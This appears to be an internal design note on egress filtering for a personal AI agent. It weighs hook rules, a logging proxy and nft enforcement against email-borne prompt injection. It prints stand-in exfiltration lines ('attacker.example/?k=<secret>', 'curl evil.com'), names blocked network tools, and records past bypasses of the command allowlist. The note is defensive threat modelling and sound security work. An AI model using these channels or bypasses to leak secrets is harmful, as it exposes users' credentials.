# Egress filtering, and the WebFetch path it can't close

**Status: reasoning recorded (2026-10-16). Nothing built.** Egress
enforcement stays deferred (START.md known gap #2) until Mike re-checks
NemoClaw/OpenShell, which he can do from home, no sooner than about
2026-10-30. Taylor's instance comes first. The one piece on her go-live path
is the unattended WebFetch rule below (`marlow-for-taylor.md`, "Order").

## An egress filter is not a web allowlist

Mike's worry (2026-10-16) was that egress filtering means a WAF, or
allowlisting the whole web. It doesn't, but nothing can give Marlow arbitrary
web reads *and* block exfiltration: the URL is a data channel.
`WebFetch https://attacker.example/?k=<secret>` is a plain read that leaks. So
the useful goal is narrower: **every way out goes through one door that can
be seen and gated.**

## What is already closed, and what isn't

Read from `server/bash_policy.py` on 2026-10-16:

- **Bash in cron is closed by the hook.** `bash_policy` is a command
  allowlist. `curl`, `wget` and `python -c` aren't on it, so they fall through
  to the phone, and unattended that is an auto-deny. Each `&&` segment is
  vetted on its own (`cat notes.md && curl evil.com` prompts).
- **Gmail writes and unvetted MCP tools** fall through the same way.
  Attended, Mike sees every prompt.
- **WebFetch in cron is open.** It is allowed unattended, and cron is where
  Marlow reads mail with nobody watching, so it's the path an injected email
  would use. Network egress filtering can't close it without allowlisting the
  web.

What egress enforcement adds today is a **backstop for when the logic
fails**, not a new protection. `bash_policy` has been bypassed four times
(the string it read wasn't the command the shell ran), which is why secrets
are hidden by bwrap and not by policy alone. Egress would be the same
kernel-level backstop for the network. Deferring it is a bet that the hook
and `bash_policy` have no unknown bypass: real, known, and the bet made since
v2 shipped.

## The options, in value order

1. **An unattended WebFetch rule in the hook (do first; Taylor's gate).**
   The hook already sees every WebFetch URL before the fetch. Candidate
   rules, not chosen: unattended turns may not fetch a domain that appears in
   the content being processed, or one Marlow hasn't fetched before. Chat is
   untouched. This is a hook rule under OpenShell too (below), so it isn't
   throwaway either way. Matters more once Taylor's API key is in an env
   where `printenv` reads it (`marlow-for-taylor.md`, Q5).
2. **A log-only week.** A local hostname proxy that allows everything and
   records each host the service user reaches, and through which path. It
   turns "Marlow needs the web" into a list, and that list *is* OpenShell's
   network policy if Marlow moves there. Not throwaway. Also settles an
   unverified belief: that the CLI's WebFetch fetches from the box (so egress
   rules would affect it) while WebSearch runs on Anthropic's side.
3. **Enforcement:** nft restricting the service uids to loopback-to-proxy,
   DNS and tailscale0, with the proxy allowlisting by hostname. Hostname, not
   resolved IP, is what fixes the Cloudflare rotation that stalled
   `deploy/egress.nft`. Still blocked on the npm/pip build running as
   `marlow` (`deploy/README.md` §9). **Throwaway if Marlow moves under
   OpenShell within a few months**, so it waits on Mike's NemoClaw check.

## OpenShell / NemoClaw, compared (from the 2026-07-16 source read)

Basis: `docs/marlow-v2-design.md` §9.2 and §9.3. An alpha project, three
months stale at the time of writing; re-check before relying on any of it.

**Better than anything we'd build:**
- **Credential injection by L7 proxy** (`resolve:env`,
  `request_body_credential_rewrite`). Secrets are added to outbound requests
  and never live inside the sandbox, so `printenv` in a turn finds nothing.
  That's the clean fix for Taylor's key exposure, which our standalone design
  can't match without building a similar proxy.
- **Per-host, per-method, per-path egress**, plus landlock filesystem rules
  and syscall containment, enforced below anything the agent can reach, and
  maintained by someone else.

**No better than ours:** arbitrary web reads are still an exfiltration
channel. OpenShell works at the network, filesystem and syscall layers, not
tool meaning. Keeping Marlow useful still means broad GETs, so option 1 is
still needed and the phone round-trip stays (§9.1's conclusion).

**The costs, as of July:** no path for outside agents to be added (a
manifest plus per-agent TypeScript in NemoClaw's control plane, schema
mid-migration); the daily assistant depending on an alpha project; and the
riskiest unknown, whether the Pro OAuth token *and its headless refresh*
work through the credential proxy. If they don't, `claude -p` can't
authenticate in the sandbox and the CLI-not-SDK premise breaks. Taylor's
instance, on a plain API key, is the easier test of that proxy.

**What Mike's re-check should answer:** is there now a path for adding an
outside agent; does the credential proxy carry an OAuth bearer token with
refresh (not just a static key); and is the schema stable. A yes on all three
makes option 3 throwaway, so skip it. A no on any of them points to building
option 3 ourselves, after option 2's list.

## What would change the answer

- **The Bash allowlist widening toward network tools.** Egress then stops
  being a backstop and becomes the only control. Build it first.
- **A hook or `bash_policy` bypass found in the wild.** The bet above lost.
- **Taylor live without option 1.** Her key plus her inbox on the open
  WebFetch path, with only the spend cap behind it.
